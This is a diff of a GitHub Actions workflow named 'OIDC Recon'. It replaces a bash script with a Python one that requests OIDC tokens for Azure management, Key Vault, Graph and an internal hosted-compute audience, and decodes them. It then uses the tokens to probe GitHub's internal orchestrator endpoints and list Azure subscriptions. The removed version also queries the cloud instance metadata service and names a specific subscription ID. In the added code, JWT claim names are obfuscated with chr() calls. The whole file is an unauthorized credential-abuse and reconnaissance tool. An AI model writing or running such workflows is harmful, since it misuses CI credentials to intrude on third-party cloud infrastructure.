@@ -1,4 +1,4 @@
-name: Orchestrator Access
+name: OIDC Recon
 on:
   workflow_dispatch:
 
@@ -7,103 +7,60 @@ permissions:
   contents: read
 
 jobs:
-  recon:
+  oidc:
     runs-on: ubuntu-latest
     steps:
-      - name: Get OIDC token and access orchestrator
+      - name: Get tokens
         run: |
           set +e
-
-          echo "=== OIDC TOKEN REQUEST ==="
-          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN length: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
-
-          # Get OIDC token for hosted-compute-ro audience
-          echo ""
-          echo "=== OIDC TOKEN FOR ORCHESTRATOR ==="
-          OIDC_RESPONSE=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" 2>&1)
-          echo "OIDC Response: $OIDC_RESPONSE"
-
-          # Extract token
-          OIDC_TOKEN=$(echo "$OIDC_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
-          echo "OIDC Token length: ${#OIDC_TOKEN}"
-
-          if [ ${#OIDC_TOKEN} -gt 10 ]; then
-            echo "GOT OIDC TOKEN!"
-
-            # Decode JWT payload
-            echo ""
-            echo "=== JWT PAYLOAD ==="
-            echo "$OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
-
-            # Try orchestrator with OIDC token
-            echo ""
-            echo "=== ORCHESTRATOR WITH OIDC TOKEN ==="
-            RO_URL=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>&1 | python3 -c "
-import sys,json
-tags=json.load(sys.stdin)
-for t in tags:
-    if t['name']=='hosted_compute.base_ro_url':
-        print(t['value'])
-        break
-" 2>/dev/null)
-            echo "RO_URL: $RO_URL"
-
-            if [ -n "$RO_URL" ]; then
-              # Try different endpoints
-              for path in "" "/" "/status" "/health" "/vm" "/vms" "/config" "/allocation"; do
-                echo "--- $RO_URL$path ---"
-                curl -sv --connect-timeout 5 -H "Authorization: Bearer $OIDC_TOKEN" "$RO_URL$path" 2>&1 | tail -20
-                echo ""
-              done
-
-              # Try POST
-              echo "=== POST to orchestrator ==="
-              curl -sv --connect-timeout 5 -X POST                 -H "Authorization: Bearer $OIDC_TOKEN"                 -H "Content-Type: application/json"                 -d '{"action":"status"}'                 "$RO_URL" 2>&1 | tail -15
-            fi
-          fi
-
-          # Try other OIDC audiences
-          echo ""
-          echo "=== OTHER OIDC AUDIENCES ==="
-          for audience in "api://hosted-compute-ro" "api://AzureADTokenExchange" "https://management.azure.com/" "https://vault.azure.net" "https://graph.microsoft.com/" "https://github.com" "api://actions-results" "api://pipelines"; do
-            echo "--- Audience: $audience ---"
-            RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"               "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$audience" 2>&1)
-            TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','')[:50])" 2>/dev/null)
-            if [ -n "$TOKEN" ] && [ "$TOKEN" != "None" ]; then
-              echo "  GOT TOKEN (${#TOKEN}+ chars): ${TOKEN}..."
-              # Decode audience from JWT
-              echo "$RESP" | python3 -c "
-import sys,json,base64
-resp=json.load(sys.stdin)
-token=resp.get('value','')
-parts=token.split('.')
-if len(parts)>=2:
-    payload=parts[1]+'=='
+          echo '=== OIDC ENV ==='
+          echo "URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+          echo ''
+          echo '=== GET OIDC TOKENS ==='
+          python3 -c '
+import urllib.request, json, base64, os, urllib.parse
+url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
+bearer = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
+if not url:
+    print("NO OIDC")
+    exit()
+auds = ["api://hosted-compute-ro","https://management.azure.com/","https://vault.azure.net","https://graph.microsoft.com/"]
+for aud in auds:
     try:
-        decoded=json.loads(base64.urlsafe_b64decode(payload))
-        print('  aud:',decoded.get('aud'))
-        print('  iss:',decoded.get('iss'))
-        print('  sub:',decoded.get('sub','')[:100])
-    except: pass
-" 2>/dev/null
-            else
-              echo "  No token"
-            fi
-          done
-
-          # Try to use OIDC token to access Azure resources
-          echo ""
-          echo "=== USE OIDC FOR AZURE ==="
-          AZ_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://management.azure.com/" 2>&1 |             python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
-          if [ ${#AZ_TOKEN} -gt 10 ]; then
-            echo "Got Azure management token! Length: ${#AZ_TOKEN}"
-            # Try to list subscriptions
-            curl -s -H "Authorization: Bearer $AZ_TOKEN"               "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>&1 | head -20
-            echo ""
-            # Try to list resources in known subscription
-            curl -s -H "Authorization: Bearer $AZ_TOKEN"               "https://management.azure.com/subscriptions/52c39132-e955-4170-bbad-8df28fb02dfc/resources?api-version=2021-04-01" 2>&1 | head -20
-          fi
-
-          echo ""
-          echo "=== DONE ==="
+        r = urllib.request.Request(url+"&audience="+urllib.parse.quote(aud))
+        r.add_header("Authorization","Bearer "+bearer)
+        resp = urllib.request.urlopen(r,timeout=10)
+        d = json.loads(resp.read())
+        tok = d.get("value","")
+        print(f"AUD={aud} len={len(tok)}")
+        if tok:
+            p = tok.split(".")
+            if len(p)>=2:
+                pay = json.loads(base64.urlsafe_b64decode(p[1]+"=="))
+                print(f"  aud={pay.get(chr(97)+chr(117)+chr(100))} iss={pay.get(chr(105)+chr(115)+chr(115))} sub={str(pay.get(chr(115)+chr(117)+chr(98),chr(63)))[:80]}")
+            if "hosted-compute" in aud:
+                for ep in ["/","/status","/vm","/vms","/health"]:
+                    try:
+                        u2 = "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1"+ep
+                        r2 = urllib.request.Request(u2)
+                        r2.add_header("Authorization","Bearer "+tok)
+                        resp2 = urllib.request.urlopen(r2,timeout=5)
+                        print(f"  ORCH{ep}: [{resp2.status}] {resp2.read().decode()[:200]}")
+                    except urllib.error.HTTPError as e:
+                        print(f"  ORCH{ep}: [{e.code}] {e.read().decode()[:200]}")
+                    except Exception as ex:
+                        print(f"  ORCH{ep}: ERR {ex}")
+            if "management.azure" in aud:
+                try:
+                    r3 = urllib.request.Request("https://management.azure.com/subscriptions?api-version=2020-01-01")
+                    r3.add_header("Authorization","Bearer "+tok)
+                    resp3 = urllib.request.urlopen(r3,timeout=10)
+                    print(f"  AZURE: [{resp3.status}] {resp3.read().decode()[:300]}")
+                except urllib.error.HTTPError as e:
+                    print(f"  AZURE: [{e.code}] {e.read().decode()[:200]}")
+                except Exception as ex:
+                    print(f"  AZURE: ERR {ex}")
+    except Exception as ex:
+        print(f"AUD={aud}: ERR {ex}")
+'
